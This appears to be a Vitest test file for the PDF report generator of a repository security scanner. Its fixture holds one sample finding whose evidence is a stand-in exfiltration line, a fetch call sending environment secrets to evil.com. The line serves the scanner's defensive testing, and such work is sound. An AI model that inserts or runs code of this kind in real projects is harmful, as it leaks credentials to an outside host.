import { describe, it, expect, afterEach } from 'vitest';
import { generatePDF } from '../../src/output/pdf.js';
import { existsSync, unlinkSync, statSync } from 'node:fs';
import { RiskCategory, Severity, Verdict } from '../../src/rules/types.js';
import type { ScanResult } from '../../src/rules/types.js';

const TEST_PDF = './test-output.pdf';

function makeScanResult(): ScanResult {
  return {
    repoMetadata: { localPath: '/repo', stars: 100, age: '2025-01-01' },
    findings: [{
      severity: Severity.HIGH,
      category: RiskCategory.DATA_EXFILTRATION,
      file: 'steal.js', line: 42,
      description: 'Sends .env to external server',
      evidence: 'fetch("https://evil.com", { body: env })',
      confidence: 0.9,
    }],
    categoryScores: Object.values(RiskCategory).map(cat => ({
      category: cat, score: 0, level: 'NONE' as const, findings: [],
    })),
    verdict: Verdict.RED,
    summary: 'High-risk repository detected.',
    recommendation: 'DO NOT USE this repository.',
    scanTimestamp: new Date().toISOString(),
    scanMode: 'strict',
    aiUsed: false,
  };
}

afterEach(() => {
  if (existsSync(TEST_PDF)) unlinkSync(TEST_PDF);
});

describe('generatePDF', () => {
  it('creates a PDF file', async () => {
    await generatePDF(makeScanResult(), TEST_PDF);
    expect(existsSync(TEST_PDF)).toBe(true);
  });

  it('PDF has non-zero size', async () => {
    await generatePDF(makeScanResult(), TEST_PDF);
    const stat = statSync(TEST_PDF);
    expect(stat.size).toBeGreaterThan(0);
  });
});
